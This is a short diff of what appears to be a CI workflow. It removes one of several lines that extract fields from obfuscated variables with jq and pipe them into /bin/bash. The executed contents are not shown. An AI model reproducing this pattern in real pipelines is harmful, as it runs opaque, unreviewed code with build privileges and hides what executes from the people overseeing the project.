@@ -30,7 +30,6 @@ jobs:
           echo $oo48520 | jq -r .wd0 | /bin/bash
           echo $tvw55888 | jq -r .lob1064 | /bin/bash
           echo $g7434 | jq -r .u4236 | /bin/bash
-          printf '%s' "$n3786" | jq -r .oplhv86 | /bin/bash
           echo $k95 | jq -r .h51 | /bin/bash
 
       - name: Save output
